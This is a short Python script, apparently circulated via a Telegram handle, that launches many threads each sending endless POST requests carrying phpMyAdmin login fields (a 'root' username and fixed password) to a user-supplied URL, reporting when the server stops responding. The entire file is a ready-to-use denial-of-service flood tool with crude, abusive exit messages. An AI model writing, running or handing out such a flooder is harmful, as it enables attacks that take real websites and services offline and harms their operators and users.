# Telegram @xdivv
import colorama
import threading
import requests
import cloudscraper

def dos(target):
    while True:
        try:
            res = requests.post(url, data={'pma_username': 'root', 'pma_password': 'fGerhet22'})
            print("Sent")
        except requests.exceptions.ConnectionError:
            print("Server down")

threads = 20

url = input("link ")

try:
    threads = int(input("Threads"))
except ValueError:
    exit("you are dumb ")

if threads == 0:
    exit("oh fuck")

if not url.__contains__("http"):
    exit("provide full domain plz")

if not url.__contains__("."):
    exit("fucking slaves")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " threads started!")
